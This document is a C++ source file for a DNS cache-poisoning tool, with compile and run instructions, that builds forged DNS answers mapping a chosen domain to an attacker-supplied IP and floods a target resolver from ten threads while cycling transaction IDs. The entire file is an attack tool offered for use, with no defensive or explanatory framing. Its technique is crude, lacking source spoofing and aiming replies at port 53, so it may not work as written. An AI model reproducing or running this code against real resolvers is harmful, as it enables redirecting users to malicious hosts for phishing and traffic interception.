// Compile: g++ -o dns_poison dns_poison.cpp -lpthread
// Run: sudo ./dns_poison <target_dns> <domain> <spoofed_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <atomic>

class DNSCachePoison {
private:
    std::string targetDNS;
    std::string domain;
    std::string spoofIP;
    std::atomic<uint16_t> txid{0};
    
public:
    DNSCachePoison(const std::string& t, const std::string& d, const std::string& s)
        : targetDNS(t), domain(d), spoofIP(s) {}
    
    void sendResponse(uint16_t id) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return;
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(53);
        target.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        char packet[512];
        memset(packet, 0, sizeof(packet));
        
        // DNS Header
        *(uint16_t*)(packet + 0) = htons(id);
        *(uint16_t*)(packet + 2) = htons(0x8180);  // Response
        *(uint16_t*)(packet + 4) = htons(1);  // Questions
        *(uint16_t*)(packet + 6) = htons(1);  // Answers
        *(uint16_t*)(packet + 8) = 0;
        *(uint16_t*)(packet + 10) = 0;
        
        // Question
        int pos = 12;
        char domainCopy[256];
        strncpy(domainCopy, domain.c_str(), sizeof(domainCopy));
        char* token = strtok(domainCopy, ".");
        while (token) {
            packet[pos++] = strlen(token);
            strcpy(packet + pos, token);
            pos += strlen(token);
            token = strtok(NULL, ".");
        }
        packet[pos++] = 0;
        *(uint16_t*)(packet + pos) = htons(1); pos += 2;  // A
        *(uint16_t*)(packet + pos) = htons(1); pos += 2;  // IN
        
        // Answer
        *(uint16_t*)(packet + pos) = htons(0xC00C); pos += 2;  // Pointer
        *(uint16_t*)(packet + pos) = htons(1); pos += 2;  // A
        *(uint16_t*)(packet + pos) = htons(1); pos += 2;  // IN
        *(uint32_t*)(packet + pos) = htonl(60); pos += 4;  // TTL
        *(uint16_t*)(packet + pos) = htons(4); pos += 2;  // Length
        struct in_addr ip;
        inet_aton(spoofIP.c_str(), &ip);
        memcpy(packet + pos, &ip.s_addr, 4);
        pos += 4;
        
        sendto(sock, packet, pos, 0, (struct sockaddr*)&target, sizeof(target));
        close(sock);
    }
    
    void attack(int numThreads = 10) {
        std::vector<std::thread> threads;
        
        for (int i = 0; i < numThreads; i++) {
            threads.emplace_back([this]() {
                while (true) {
                    uint16_t id = txid.fetch_add(1);
                    sendResponse(id);
                }
            });
        }
        
        for (auto& t : threads) t.join();
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <dns_server> <domain> <spoof_ip>\n";
        return 1;
    }
    DNSCachePoison poison(argv[1], argv[2], argv[3]);
    poison.attack(10);
    return 0;
}